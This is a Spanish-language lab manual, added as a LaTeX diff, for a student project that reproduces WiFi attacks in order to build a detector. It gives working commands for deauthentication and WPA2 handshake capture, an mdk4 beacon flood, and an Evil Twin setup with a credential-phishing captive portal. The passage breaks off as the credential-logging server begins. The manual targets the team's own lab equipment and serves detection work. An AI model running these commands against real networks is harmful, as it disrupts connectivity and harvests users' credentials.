@@ -1,0 +1,1088 @@
+\documentclass[11pt,a4paper]{article}
+
+\newcommand{\doctitle}{Manual de Laboratorio}
+\newcommand{\docsubtitle}{WARDEN - Wireless Attack Reproduction and Detection Environment}
+
+\usepackage{warden-style}
+
+% Paquete extra para bloques de codigo
+\usepackage{listings}
+\lstdefinestyle{wardenshell}{
+  basicstyle=\ttfamily\small,
+  backgroundcolor=\color{wardenhighlight},
+  frame=single,
+  rulecolor=\color{wardenrule},
+  framesep=4pt,
+  framerule=0.4pt,
+  xleftmargin=8pt,
+  xrightmargin=8pt,
+  breaklines=true,
+  breakatwhitespace=false,
+  keepspaces=true,
+  showstringspaces=false,
+  literate=
+    {á}{{\'a}}1 {é}{{\'e}}1 {í}{{\'\i}}1 {ó}{{\'o}}1 {ú}{{\'u}}1
+    {Á}{{\'A}}1 {É}{{\'E}}1 {Í}{{\'I}}1 {Ó}{{\'O}}1 {Ú}{{\'U}}1
+    {ñ}{{\~n}}1 {Ñ}{{\~N}}1 {¿}{{?`}}1 {¡}{{!`}}1
+}
+\lstset{style=wardenshell}
+
+\begin{document}
+
+% -- Portada -------------------------------------------------------------------
+\wardencoverpage{0.1}{Abril 2026}{Borrador}
+
+% -- Historial de Revisiones ---------------------------------------------------
+\begin{wardenrevisions}
+\revrow{0.1}{Abril 2026}{Santiago Valencia León}{Borrador inicial}
+\revrow{0.1}{Abril 2026}{Daniel Yadir Perea Murillo}{Borrador inicial}
+\revrow{0.1}{Abril 2026}{Sofia Valdez Londono}{Borrador inicial}
+\end{wardenrevisions}
+
+% -- Tabla de Contenidos -------------------------------------------------------
+\tableofcontents
+\newpage
+
+% ==============================================================================
+\section{Introducción}
+% ==============================================================================
+
+\subsection{Propósito del documento}
+Este documento es una guía práctica paso a paso para que cualquier integrante
+del equipo WARDEN pueda, sin ayuda externa, validar el adaptador Panda
+PAU0B AC600 y ejecutar manualmente los tres ataques que el proyecto va a
+automatizar posteriormente desde la ESP32.
+
+El objetivo es triple:
+
+\begin{enumerate}
+  \item \textbf{Validar el hardware.} Confirmar que el Panda funciona
+    correctamente bajo Linux y soporta modo monitor, capacidad
+    indispensable para todo el proyecto.
+  \item \textbf{Familiarizarse con el ataque.} Ejecutar manualmente cada
+    ataque que la ESP32 va a reproducir. Ver ``con las propias manos'' cómo
+    se comporta cada uno hace que después sea mucho más fácil entender el
+    código del firmware ofensivo y del detector.
+  \item \textbf{Generar capturas de referencia.} Cada ataque manual genera
+    archivos PCAP que pueden usarse luego para desarrollar y probar el
+    detector sin necesidad de tener el Panda conectado.
+\end{enumerate}
+
+\subsection{Lectura previa requerida}
+Este documento asume que ya leíste \emph{WARDEN - Fundamentos Técnicos}.
+Si los términos \emph{frame de gestión}, \emph{beacon}, \emph{BSSID},
+\emph{modo monitor}, \emph{deauth}, \emph{handshake} no te suenan
+familiares, vuelve primero a ese documento.
+
+\subsection{Plataforma de referencia}
+Los comandos de este manual están escritos para Arch Linux, aunque la
+mayoría funcionan idénticamente en cualquier distribución reciente
+(Ubuntu, Debian, Fedora). Donde haya diferencias, se indicarán.
+
+\subsection{Recordatorio ético y legal}
+Los ataques documentados aquí solo deben ejecutarse contra:
+
+\begin{itemize}
+  \item El router de laboratorio adquirido específicamente para WARDEN.
+  \item Dispositivos de propiedad del equipo de desarrollo (Redmi Note 7,
+    Dell Latitude E6220, o cualquier otro autorizado).
+\end{itemize}
+
+Bajo ninguna circunstancia se ejecutan estos ataques contra redes,
+dispositivos o usuarios ajenos al proyecto. La Ley 1273 de 2009 tipifica
+estas actividades como delito cuando se realizan sin autorización.
+
+% ==============================================================================
+\section{Paso 0: Renombrar la interfaz a \texttt{panda0}}
+% ==============================================================================
+
+\subsection{Por qué renombrar}
+Cuando se conecta el Panda al USB, Linux le asigna un nombre largo e
+impredecible como \texttt{wlp101s0f0u1} basado en el bus USB donde se
+conectó. Este nombre \textbf{cambia si conectas el Panda a otro puerto
+USB}, lo cual rompe scripts y confunde al equipo. Vamos a configurar
+Linux para que siempre llame \texttt{panda0} a este adaptador específico,
+sin importar el puerto.
+
+\subsection{Obtener la MAC permanente del adaptador}
+Primero necesitamos la dirección MAC verdadera grabada en el chip (no la
+aleatoria que Linux le asigna por privacidad).
+
+Con el Panda conectado, ejecuta:
+
+\begin{lstlisting}
+ip link show
+\end{lstlisting}
+
+Identifica el nombre actual del Panda (algo como \texttt{wlp101s0f0u1}).
+Después ejecuta:
+
+\begin{lstlisting}
+ethtool -P wlp101s0f0u1
+\end{lstlisting}
+
+(Sustituye \texttt{wlp101s0f0u1} por el nombre real que viste arriba.)
+
+\textbf{Salida esperada:}
+
+\begin{lstlisting}
+Permanent address: 00:c0:ca:XX:XX:XX
+\end{lstlisting}
+
+Anota esa MAC. La necesitamos en el siguiente paso.
+
+\subsection{Crear la regla udev}
+\texttt{udev} es el subsistema de Linux que reacciona a eventos de
+hardware. Le vamos a pedir que cuando aparezca un adaptador con la MAC
+del Panda, lo renombre a \texttt{panda0}.
+
+Crea el archivo:
+
+\begin{lstlisting}
+sudo nvim /etc/udev/rules.d/70-panda-wifi.rules
+\end{lstlisting}
+
+Pega esta línea (sustituyendo la MAC con la que obtuviste):
+
+\begin{lstlisting}
+SUBSYSTEM==``net'', ACTION==``add'', ATTR{address}==``00:c0:ca:XX:XX:XX'', NAME=``panda0''
+\end{lstlisting}
+
+Guarda y cierra (\texttt{:wq} en nvim).
+
+\subsection{Aplicar la regla}
+
+\begin{lstlisting}
+sudo udevadm control --reload-rules
+sudo udevadm trigger
+\end{lstlisting}
+
+Si el adaptador ya estaba conectado, lo más confiable es desconectarlo
+del USB y volverlo a conectar. Verifica con:
+
+\begin{lstlisting}
+ip link | grep panda
+\end{lstlisting}
+
+Debería aparecer \texttt{panda0:} algo. \textbf{De aquí en adelante todos
+los comandos usan \texttt{panda0} como nombre.}
+
+% ==============================================================================
+\section{Paso 1: Instalación de herramientas}
+% ==============================================================================
+
+\subsection{Qué vamos a instalar y para qué}
+
+\begin{datatable}{L{2.8cm} L{13cm}}{Herramienta & Propósito}
+\drow{\texttt{iw}            & Utilidad oficial moderna del kernel para gestionar interfaces inalámbricas. Permite listar interfaces, ver capacidades del chipset, cambiar modo, fijar canales.}
+\drow{\texttt{aircrack-ng}   & Suite de auditoría WiFi con varias herramientas. Las que usamos: \texttt{airodump-ng} (escaneo y captura) y \texttt{aireplay-ng} (inyección de frames).}
+\drow{\texttt{wireshark-qt}  & Analizador gráfico de protocolos. Permite capturar tráfico en vivo o abrir archivos PCAP y visualizar cada frame con su estructura completa.}
+\drow{\texttt{tcpdump}       & Capturador de paquetes minimalista en línea de comandos. Útil para validaciones rápidas.}
+\drow{\texttt{mdk4}          & Herramienta especializada en ataques a frames de gestión 802.11. La usaremos para Beacon Flooding. Disponible en AUR.}
+\drow{\texttt{ethtool}       & Utilidad para consultar y configurar parámetros de bajo nivel de interfaces de red. La usamos para obtener la MAC permanente.}
+\drow{\texttt{hostapd}       & Daemon que convierte una interfaz WiFi en Access Point. Lo usaremos para el Evil Twin manual.}
+\drow{\texttt{dnsmasq}       & Servidor ligero combinado de DHCP y DNS. Lo usaremos para asignar IPs a las víctimas que se conecten al Evil Twin y para redirigir todas las consultas DNS al portal cautivo.}
+\end{datatable}
+
+\subsection{Comandos de instalación en Arch Linux}
+
+\begin{lstlisting}
+sudo pacman -S --needed iw aircrack-ng wireshark-qt tcpdump ethtool hostapd dnsmasq
+yay -S mdk4
+\end{lstlisting}
+
+\textbf{Equivalente en Ubuntu/Debian:}
+
+\begin{lstlisting}
+sudo apt install iw aircrack-ng wireshark tcpdump ethtool hostapd dnsmasq mdk4
+\end{lstlisting}
+
+\subsection{Permisos para Wireshark}
+Durante la instalación, el paquete pregunta si los usuarios sin
+privilegios de root deben poder capturar tráfico. Acepta esto. Después,
+agrega tu usuario al grupo \texttt{wireshark}:
+
+\begin{lstlisting}
+sudo usermod -aG wireshark $USER
+\end{lstlisting}
+
+\textbf{Por qué:} correr Wireshark como root es mala práctica de
+seguridad. Wireshark dissecta cientos de protocolos, y un bug en alguno
+de esos parsers ejecutándose como root sería catastrófico.
+
+El cambio de grupo solo aplica después de cerrar sesión y volver a
+iniciarla, o reiniciar el equipo.
+
+% ==============================================================================
+\section{Paso 2: Verificación de hardware y driver}
+% ==============================================================================
+
+Aquí confirmamos tres cosas, en orden ascendente de capa: que el adaptador
+está conectado físicamente al USB, que el kernel cargó el driver correcto,
+y que existe como interfaz wireless lista para usar.
+
+\subsection{Verificación a nivel USB}
+
+\begin{lstlisting}
+lsusb
+\end{lstlisting}
+
+\textbf{Qué hace:} lista todos los dispositivos USB conectados. Buscamos
+el chipset MediaTek MT7610U.
+
+\textbf{Salida esperada:}
+
+\begin{lstlisting}
+Bus 003 Device 004: ID 0e8d:7610 MediaTek Inc. WiFi
+\end{lstlisting}
+
+\textbf{Cómo interpretarla:}
+
+\begin{itemize}
+  \item \texttt{0e8d} es el ID asignado a MediaTek por el consorcio USB-IF.
+  \item \texttt{7610} es el ID del producto MT7610U.
+\end{itemize}
+
+Si esta línea no aparece, el problema es físico: cable USB defectuoso,
+puerto dañado o adaptador mal insertado. Prueba otro puerto antes de
+seguir.
+
+\subsection{Verificación de carga del driver}
+
+\begin{lstlisting}
+sudo dmesg | grep -i mt76
+\end{lstlisting}
+
+\textbf{Qué hace:} \texttt{dmesg} imprime el buffer de mensajes del
+kernel. Cuando se conecta el USB, el kernel intenta cargar el driver y
+registra cada paso. Filtramos por \texttt{mt76} para ver solo lo relevante.
+
+\textbf{Salida esperada (parcial):}
+
+\begin{lstlisting}
+mt76x0u 3-1:1.0: ASIC revision: 76100002 MAC revision: 76502000
+mt76x0u 3-1:1.0: EEPROM ver:01 fae:08
+usbcore: registered new interface driver mt76x0u
+mt76x0u 3-1:1.0 panda0: renamed from wlan0
+\end{lstlisting}
+
+La última línea (\texttt{renamed from wlan0}) confirma que la regla
+\texttt{udev} del Paso 0 funcionó.
+
+\subsection{Verificación a nivel de interfaz wireless}
+
+\begin{lstlisting}
+iw dev
+\end{lstlisting}
+
+\textbf{Qué hace:} lista todas las interfaces wireless registradas en el
+kernel, agrupadas por dispositivo físico (\texttt{phy}).
+
+\textbf{Salida esperada (parcial):}
+
+\begin{lstlisting}
+phy#1
+    Interface panda0
+        type managed
+        addr 2e:6b:01:d4:9a:17
+phy#0
+    Interface wlp98s0
+        ssid MiRedDeCasa
+        type managed
+        addr 58:cd:c9:3c:0d:a5
+\end{lstlisting}
+
+Aparecen dos \texttt{phy}: el de la WiFi interna de la laptop y el del
+Panda (\texttt{panda0}). El Panda aparece en \texttt{type managed} por
+defecto. Lo cambiaremos a monitor en el Paso 4.
+
+% ==============================================================================
+\section{Paso 3: Verificación de capacidades del chipset}
+% ==============================================================================
+
+Tener el adaptador conectado y reconocido no garantiza que soporte modo
+monitor. Hay que consultarlo explícitamente al driver.
+
+\begin{lstlisting}
+iw phy phy1 info | grep -A 10 ``Supported interface modes''
+\end{lstlisting}
+
+\textbf{Qué hace:} consulta el dispositivo físico \texttt{phy1} (el del
+Panda según \texttt{iw dev}) y filtra la sección de modos soportados. La
+opción \texttt{-A 10} de \texttt{grep} incluye las 10 líneas siguientes
+al match.
+
+\textbf{Salida esperada:}
+
+\begin{lstlisting}
+Supported interface modes:
+    * IBSS
+    * managed
+    * AP
+    * AP/VLAN
+    * monitor
+    * mesh point
+    * P2P-client
+    * P2P-GO
+\end{lstlisting}
+
+\textbf{Lo crítico:} que aparezca \texttt{monitor} en la lista. Si no
+aparece, el proyecto WARDEN no es viable con este adaptador. En este
+caso aparece, junto con \texttt{AP} (que necesitaremos para la fase de
+Evil Twin manual).
+
+% ==============================================================================
+\section{Paso 4: Activación del modo monitor}
+% ==============================================================================
+
+\subsection{La operación crítica del setup}
+Aquí cambiamos el adaptador de modo \emph{managed} (cliente normal) a
+modo \emph{monitor} (oyente pasivo del aire).
+
+\begin{lstlisting}
+sudo ip link set panda0 down
+sudo iw dev panda0 set type monitor
+sudo ip link set panda0 up
+sudo iw dev panda0 set channel 6
+\end{lstlisting}
+
+\textbf{Explicación de cada comando:}
+
+\begin{enumerate}
+  \item \texttt{sudo ip link set panda0 down} - Desactiva la interfaz a
+    nivel kernel. Es necesario porque no se puede cambiar el tipo de
+    interfaz mientras está activa. Solo afecta esta interfaz; la WiFi
+    interna sigue funcionando.
+  \item \texttt{sudo iw dev panda0 set type monitor} - El comando
+    central. Le indica al driver que cambie el modo. A partir de aquí,
+    el adaptador entrega al kernel todos los frames 802.11 que reciba,
+    sin filtrar por destinatario.
+  \item \texttt{sudo ip link set panda0 up} - Reactiva la interfaz, ya
+    en modo monitor.
+  \item \texttt{sudo iw dev panda0 set channel 6} - Sintoniza el
+    adaptador en el canal 6 (2437 MHz). \textbf{El canal debe coincidir
+    con el del router de laboratorio cuando esté configurado.}
+\end{enumerate}
+
+\subsection{Importante: persistencia}
+\textbf{Estos cambios no son persistentes.} Si reinicias el sistema,
+desconectas el USB del Panda, o el sistema entra en suspensión, el
+adaptador vuelve a \texttt{managed}. En cada sesión hay que volver a
+ejecutar la secuencia.
+
+\subsection{Verificación}
+
+\begin{lstlisting}
+iw dev panda0 info
+\end{lstlisting}
+
+\textbf{Salida esperada (parcial):}
+
+\begin{lstlisting}
+Interface panda0
+    addr 4a:c9:7b:ce:34:46
+    type monitor
+    channel 6 (2437 MHz), width: 20 MHz (no HT)
+    txpower 9.00 dBm
+\end{lstlisting}
+
+\texttt{type monitor} y \texttt{channel 6} confirman éxito.
+
+\subsection{Revertir al estado normal}
+Al terminar las pruebas:
+
+\begin{lstlisting}
+sudo ip link set panda0 down
+sudo iw dev panda0 set type managed
+sudo ip link set panda0 up
+\end{lstlisting}
+
+% ==============================================================================
+\section{Paso 5: Validación end-to-end de la captura}
+% ==============================================================================
+
+\subsection{Validación rápida con tcpdump}
+
+\begin{lstlisting}
+sudo tcpdump -i panda0 -c 20 -e
+\end{lstlisting}
+
+\textbf{Flags:}
+
+\begin{itemize}
+  \item \texttt{-i panda0} - interfaz a escuchar.
+  \item \texttt{-c 20} - capturar 20 paquetes y terminar.
+  \item \texttt{-e} - mostrar encabezados de capa de enlace (capa 2).
+\end{itemize}
+
+\textbf{Lo esperado:} líneas con timestamp, frecuencia, RSSI y descripción
+del frame:
+
+\begin{lstlisting}
+22:13:45.123 1.0 Mb 2437 MHz 11b -56dB signal Beacon (MiRed) [...] CH: 6
+\end{lstlisting}
+
+Si los 20 paquetes llegan en pocos segundos, la captura funciona.
+
+\subsection{Captura completa con Wireshark}
+
+\begin{lstlisting}
+wireshark
+\end{lstlisting}
+
+(o desde el menú de tu entorno gráfico)
+
+\textbf{Pasos:}
+
+\begin{enumerate}
+  \item Doble clic en la interfaz \texttt{panda0} para iniciar captura.
+  \item La pantalla se llena de frames 802.11. Verás:
+    \begin{itemize}
+      \item \texttt{802.11 Beacon frame} - cada AP emite unos 10 por
+        segundo.
+      \item \texttt{802.11 Probe Request} - clientes buscando redes
+        conocidas.
+      \item \texttt{802.11 Probe Response} - APs respondiendo.
+      \item \texttt{802.11 Acknowledgment} - ACKs de capa 2.
+    \end{itemize}
+  \item Filtros útiles para escribir en la barra de filtros:
+\end{enumerate}
+
+\textbf{Solo beacons (todas las redes visibles):}
+
+\begin{lstlisting}
+wlan.fc.type_subtype == 0x08
+\end{lstlisting}
+
+\textbf{Solo deauths (en condiciones normales casi cero; el detector
+busca anomalías aquí):}
+
+\begin{lstlisting}
+wlan.fc.type_subtype == 0x0c
+\end{lstlisting}
+
+\textbf{Tráfico de un BSSID específico:}
+
+\begin{lstlisting}
+wlan.bssid == aa:bb:cc:dd:ee:ff
+\end{lstlisting}
+
+\textbf{Vista resumen de redes:} menú \texttt{Wireless} $\rightarrow$
+\texttt{WLAN Traffic}. Tabla con todas las redes detectadas, BSSID, SSID,
+canal, conteo de paquetes.
+
+\textbf{Guardar la captura:} \texttt{File} $\rightarrow$ \texttt{Save As}
+$\rightarrow$ archivo con extensión \texttt{.pcapng}. Conviene guardar
+todas las capturas como evidencia y como insumo para que los compañeros
+desarrollen el detector sin necesidad de tener el Panda.
+
+% ==============================================================================
+\section{Ataque manual 1: Captura de handshake WPA2 con deauth}
+% ==============================================================================
+
+\subsection{¿Qué vamos a hacer?}
+Vamos a forzar a un cliente conectado a la red de laboratorio a
+reconectarse, y en esa reconexión vamos a capturar el handshake WPA2 de 4
+vías. La técnica usa dos comandos: uno escuchando, otro inyectando
+deauths.
+
+\textbf{Aclaración:} en WARDEN no vamos a crackear la contraseña a partir
+del handshake. El objetivo aquí es solamente \emph{ver el deauth en
+acción} y entender qué evidencia deja, porque ese es el ataque que el
+detector debe identificar en la fase 2 de la cadena.
+
+\subsection{Preparación: identificar la red objetivo}
+Con \texttt{panda0} en modo monitor, ejecuta:
+
+\begin{lstlisting}
+sudo airodump-ng panda0
+\end{lstlisting}
+
+\textbf{Qué hace:} muestra en tiempo real una tabla con todos los APs y
+clientes en el aire. Arriba lista APs, abajo lista clientes (stations).
+
+\textbf{Columnas importantes (sección APs):}
+
+\begin{itemize}
+  \item \texttt{BSSID} - MAC del AP.
+  \item \texttt{CH} - canal.
+  \item \texttt{ENC} - tipo de cifrado (esperamos \texttt{WPA2}).
+  \item \texttt{ESSID} - nombre de la red.
+\end{itemize}
+
+\textbf{Columnas importantes (sección clientes):}
+
+\begin{itemize}
+  \item \texttt{BSSID} - el AP al que está asociado.
+  \item \texttt{STATION} - MAC del cliente.
+\end{itemize}
+
+Deja correr unos 30 segundos para que aparezcan clientes activos. Después
+\texttt{Ctrl+C}.
+
+\textbf{Anota:}
+
+\begin{itemize}
+  \item BSSID del router de laboratorio.
+  \item Canal del router.
+  \item MAC de un cliente conectado (típicamente, el celular Redmi Note 7
+    o la laptop Dell asociados a la red).
+\end{itemize}
+
+\subsection{Enfocar la captura en la red objetivo}
+Ahora capturamos solo el tráfico del router de laboratorio:
+
+\begin{lstlisting}
+sudo airodump-ng --bssid <BSSID-DEL-ROUTER> -c <CANAL> -w handshake panda0
+\end{lstlisting}
+
+Sustituye \texttt{<BSSID-DEL-ROUTER>} y \texttt{<CANAL>} por los valores
+que anotaste.
+
+\textbf{Flags:}
+
+\begin{itemize}
+  \item \texttt{--bssid} - filtra por la MAC del router.
+  \item \texttt{-c} - canal (debe coincidir con el del router).
+  \item \texttt{-w handshake} - prefijo del archivo de salida. Se
+    generarán \texttt{handshake-01.cap}, \texttt{handshake-01.csv}, etc.
+\end{itemize}
+
+\textbf{Deja corriendo en esta terminal.} Aquí aparecerá el handshake
+cuando lo capturemos.
+
+\subsection{Forzar el handshake con deauth}
+Abre \textbf{otra terminal} (sin cerrar la anterior) y ejecuta:
+
+\begin{lstlisting}
+sudo aireplay-ng --deauth 5 -a <BSSID-DEL-ROUTER> -c <MAC-DEL-CLIENTE> panda0
+\end{lstlisting}
+
+\textbf{Flags:}
+
+\begin{itemize}
+  \item \texttt{--deauth 5} - enviar 5 frames de deauth.
+  \item \texttt{-a} - BSSID del router.
+  \item \texttt{-c} - MAC del cliente objetivo.
+\end{itemize}
+
+\textbf{Qué pasa:} \texttt{aireplay-ng} inyecta frames que aparentan
+venir del router (con el BSSID falsificado) diciéndole al cliente
+``desconéctate''. El cliente obedece y automáticamente intenta
+reconectarse, y en esa reconexión incluye el handshake.
+
+\subsection{Verificar que el handshake fue capturado}
+Vuelve a la terminal de \texttt{airodump-ng}. Si funcionó, en la
+\textbf{esquina superior derecha} aparecerá:
+
+\begin{lstlisting}
+[ WPA handshake: <BSSID-DEL-ROUTER> ]
+\end{lstlisting}
+
+Si no aparece, repite el \texttt{aireplay-ng} con más paquetes
+(\texttt{--deauth 20}). Si sigue sin aparecer, posibles causas:
+
+\begin{itemize}
+  \item El cliente está demasiado lejos del Panda (señal débil).
+  \item El cliente no se reconectó (intenta con otro cliente).
+  \item PMF (802.11w) está activo en el router. Verifica la configuración
+    del router de laboratorio y desactívalo si es necesario.
+\end{itemize}
+
+Cuando aparezca, \texttt{Ctrl+C} en \texttt{airodump-ng}. Habrá varios
+archivos generados; el que nos interesa es \texttt{handshake-01.cap}.
+
+\subsection{Confirmar el handshake con aircrack-ng}
+
+\begin{lstlisting}
+aircrack-ng handshake-01.cap
+\end{lstlisting}
+
+\textbf{Salida esperada:}
+
+\begin{lstlisting}
+Opening handshake-01.cap
+Read 12345 packets.
+
+   #  BSSID              ESSID            Encryption
+   1  E4:AB:89:D6:9B:80  LAB_WARDEN_UTP   WPA (1 handshake)
+\end{lstlisting}
+
+\textbf{\texttt{WPA (1 handshake)}} confirma que la captura contiene un
+handshake válido.
+
+\subsection{Lo que aprendimos}
+Acabamos de ejecutar la \textbf{Fase 2 de la cadena WARDEN}
+(Deauthentication) de forma manual. Lo importante es entender qué
+evidencia dejaste en el aire:
+
+\begin{itemize}
+  \item Frames de deauth originados desde una MAC que suplanta al
+    router legítimo.
+  \item Reconexión inmediata del cliente con su handshake WPA2 visible.
+\end{itemize}
+
+\textbf{Esa es exactamente la firma que el detector de WARDEN debe
+identificar.} Guarda el archivo \texttt{handshake-01.cap} - es una
+referencia útil para el desarrollo del detector.
+
+% ==============================================================================
+\section{Ataque manual 2: Beacon Flooding}
+% ==============================================================================
+
+\subsection{¿Qué vamos a hacer?}
+Vamos a usar la herramienta \texttt{mdk4} para emitir miles de beacons
+falsos por segundo, anunciando redes inexistentes. Esto reproduce la
+\textbf{Fase 1 de la cadena WARDEN} (Beacon Flooding).
+
+\subsection{Preparación}
+\texttt{panda0} debe estar en modo monitor (Paso 4). No es estrictamente
+necesario fijar canal si vamos a dejar que \texttt{mdk4} brinque entre
+ellos, pero para que el ataque sea reproducible y detectable lo
+emitiremos en el canal del router de laboratorio.
+
+\subsection{Lanzar el beacon flood}
+
+\begin{lstlisting}
+sudo mdk4 panda0 b -n ``FakeNet'' -c 6
+\end{lstlisting}
+
+\textbf{Flags:}
+
+\begin{itemize}
+  \item \texttt{panda0} - interfaz en modo monitor.
+  \item \texttt{b} - modo ``beacon flood'' de mdk4.
+  \item \texttt{-n ``FakeNet''} - prefijo de los SSIDs falsos. Se generan
+    \texttt{FakeNet}, \texttt{FakeNet1}, \texttt{FakeNet2}, etc.
+  \item \texttt{-c 6} - canal donde emitir.
+\end{itemize}
+
+\textbf{Variantes útiles:}
+
+\begin{lstlisting}
+# Flood con SSIDs completamente aleatorios
+sudo mdk4 panda0 b -c 6
+
+# Flood con SSIDs leídos de un archivo (uno por línea)
+sudo mdk4 panda0 b -f lista-ssids.txt -c 6
+
+# Flood emitiendo redes que aparentan estar protegidas con WPA2
+sudo mdk4 panda0 b -w -c 6
+\end{lstlisting}
+
+Deja corriendo unos 5 a 10 segundos y \texttt{Ctrl+C} para parar. Más
+tiempo no es necesario para validar el ataque y satura el aire
+innecesariamente.
+
+\subsection{Verificar que el ataque funciona}
+Toma un celular o laptop y abre la lista de redes WiFi. Deberían aparecer
+decenas o cientos de redes con nombres tipo \texttt{FakeNet},
+\texttt{FakeNet1}, \texttt{FakeNet2}, etc. Esto confirma que los beacons
+están siendo recibidos por dispositivos reales.
+
+\subsection{Capturar el ataque con Wireshark}
+En paralelo al \texttt{mdk4}, abre Wireshark escuchando en \texttt{panda0}
+(el mismo Panda puede capturar y emitir simultáneamente porque el modo
+monitor es pasivo y \texttt{mdk4} es activo). Aplica el filtro:
+
+\begin{lstlisting}
+wlan.fc.type_subtype == 0x08
+\end{lstlisting}
+
+Verás una avalancha de beacons por segundo, mucho mayor a lo normal.
+Guarda la captura como \texttt{beacon-flood.pcapng}. Este archivo es
+\textbf{muy valioso} para el proyecto: es un ejemplo real del ataque
+usable para desarrollar y validar el detector sin relanzar el ataque.
+
+\subsection{Lo que aprendimos}
+La firma de detección del Beacon Flooding incluye:
+
+\begin{itemize}
+  \item Tasa de beacons únicos por segundo muy superior a lo normal.
+  \item Múltiples BSSIDs nuevos apareciendo en intervalos cortos.
+  \item En el caso de \texttt{mdk4}, los BSSIDs falsos siguen una
+    secuencia que también puede ser una pista.
+\end{itemize}
+
+% ==============================================================================
+\section{Ataque manual 3: Evil Twin con portal cautivo}
+% ==============================================================================
+
+\subsection{¿Qué vamos a hacer?}
+Este es el ataque más complejo de los tres y reproduce la \textbf{Fase 3
+de la cadena WARDEN} (Evil Twin). Necesitamos:
+
+\begin{enumerate}
+  \item Configurar el Panda como Access Point con el mismo SSID que la
+    red legítima de laboratorio, pero \emph{sin contraseña}.
+  \item Configurar un servidor DHCP para asignar IPs a las víctimas que
+    se conecten.
+  \item Configurar un servidor DNS que redirija \emph{todas} las consultas
+    a nuestra propia IP.
+  \item Servir una página web mínima (el portal cautivo) que solicite
+    credenciales.
+\end{enumerate}
+
+\textbf{Para este ataque necesitamos un segundo adaptador WiFi}, porque
+el Panda no puede operar simultáneamente en modo monitor (para captura)
+y en modo AP (para el Evil Twin). Lo más práctico es:
+
+\begin{itemize}
+  \item Usar la WiFi interna de la laptop como AP del Evil Twin.
+  \item Usar el Panda como detector pasivo en modo monitor.
+\end{itemize}
+
+Si tu WiFi interna no soporta modo AP, necesitarás un segundo adaptador
+USB. Para simplificar, este manual asume que sí lo soporta. Verifica con:
+
+\begin{lstlisting}
+iw list | grep -A 10 ``Supported interface modes''
+\end{lstlisting}
+
+\textbf{Aclaración importante:} en el proyecto WARDEN final, la ESP32
+hará todo esto sola. Aquí lo hacemos manualmente con \texttt{hostapd} +
+\texttt{dnsmasq} + un servidor web Python para entender qué hace cada
+componente.
+
+\subsection{Configurar hostapd (el AP)}
+Crea el archivo \texttt{/tmp/eviltwin-hostapd.conf}:
+
+\begin{lstlisting}
+sudo nvim /tmp/eviltwin-hostapd.conf
+\end{lstlisting}
+
+Pega este contenido (sustituye \texttt{wlp98s0} por el nombre de tu WiFi
+interna que viste en el Paso 2):
+
+\begin{lstlisting}
+interface=wlp98s0
+driver=nl80211
+ssid=LAB_WARDEN_UTP
+hw_mode=g
+channel=6
+auth_algs=1
+wmm_enabled=0
+ignore_broadcast_ssid=0
+\end{lstlisting}
+
+\textbf{Explicación de cada línea:}
+
+\begin{itemize}
+  \item \texttt{interface} - el adaptador que actuará como AP.
+  \item \texttt{driver=nl80211} - el driver moderno estándar de Linux.
+  \item \texttt{ssid} - el nombre de la red. Debe coincidir con el del
+    router legítimo para que sea un Evil Twin convincente.
+  \item \texttt{hw\_mode=g} - banda 2.4 GHz.
+  \item \texttt{channel=6} - canal donde emitir.
+  \item \texttt{auth\_algs=1} - autenticación abierta (sin WPA).
+  \item \texttt{ignore\_broadcast\_ssid=0} - el SSID es visible.
+\end{itemize}
+
+\subsection{Configurar dnsmasq (DHCP + DNS)}
+Crea \texttt{/tmp/eviltwin-dnsmasq.conf}:
+
+\begin{lstlisting}
+sudo nvim /tmp/eviltwin-dnsmasq.conf
+\end{lstlisting}
+
+Pega:
+
+\begin{lstlisting}
+interface=wlp98s0
+dhcp-range=10.0.0.10,10.0.0.50,12h
+dhcp-option=3,10.0.0.1
+dhcp-option=6,10.0.0.1
+address=/#/10.0.0.1
+\end{lstlisting}
+
+\textbf{Explicación:}
+
+\begin{itemize}
+  \item \texttt{interface=wlp98s0} - escucha en la interfaz del Evil Twin.
+  \item \texttt{dhcp-range} - asigna IPs entre \texttt{10.0.0.10} y
+    \texttt{10.0.0.50} con duración de 12 horas.
+  \item \texttt{dhcp-option=3,10.0.0.1} - el gateway por defecto que
+    los clientes recibirán.
+  \item \texttt{dhcp-option=6,10.0.0.1} - el servidor DNS que los
+    clientes usarán (nosotros).
+  \item \texttt{address=/\#/10.0.0.1} - la ``magia'' del portal cautivo:
+    cualquier consulta DNS, sin importar el dominio (\texttt{google.com},
+    \texttt{facebook.com}, lo que sea) se resuelve a \texttt{10.0.0.1},
+    que somos nosotros. Cuando la víctima abra el navegador para ``ir a
+    cualquier sitio'', caerá en nuestro portal.
+\end{itemize}
+
+\subsection{Configurar la IP del AP}
+Antes de levantar \texttt{hostapd}, asignamos la IP \texttt{10.0.0.1} a
+la interfaz que actuará como AP:
+
+\begin{lstlisting}
+sudo ip addr add 10.0.0.1/24 dev wlp98s0
+\end{lstlisting}
+
+\subsection{Crear el portal cautivo (página web mínima)}
+Crea un directorio para el portal:
+
+\begin{lstlisting}
+mkdir -p ~/eviltwin-portal
+cd ~/eviltwin-portal
+\end{lstlisting}
+
+Crea el archivo \texttt{index.html}:
+
+\begin{lstlisting}
+nvim ~/eviltwin-portal/index.html
+\end{lstlisting}
+
+Pega este contenido (es un portal cautivo mínimo, claramente identificado
+como demostración educativa):
+
+\begin{lstlisting}
+<!DOCTYPE html>
+<html lang=``es''>
+<head>
+  <meta charset=``UTF-8''>
+  <title>Re-autenticacion requerida</title>
+</head>
+<body style=``font-family: sans-serif; max-width: 500px; margin: 50px auto;''>
+  <div style=``border: 3px solid red; padding: 10px; margin-bottom: 20px;''>
+    <strong>WARDEN - DEMOSTRACION EDUCATIVA</strong><br>
+    Este es un portal cautivo falso usado solo para fines educativos.<br>
+    No ingreses credenciales reales.
+  </div>
+  <h1>Re-autenticacion requerida</h1>
+  <p>Por favor inicia sesion para continuar usando la red.</p>
+  <form action=``/captura'' method=``POST''>
+    <p>Usuario: <input type=``text'' name=``usuario'' required></p>
+    <p>Contrasena: <input type=``password'' name=``password'' required></p>
+    <p><button type=``submit''>Iniciar sesion</button></p>
+  </form>
+</body>
+</html>
+\end{lstlisting}
+
+Crea un servidor Python mínimo que sirva la página y registre las
+credenciales (\texttt{servidor.py}):
+
+\begin{lstlisting}
+nvim ~/eviltwin-portal/servidor.py
+\end{lstlisting}
+
+Pega:
+
+\begin{lstlisting}
+from http.server import BaseHTTPRequestHandler, HTTPServer
+from urllib.parse import parse_qs
+import datetime
+
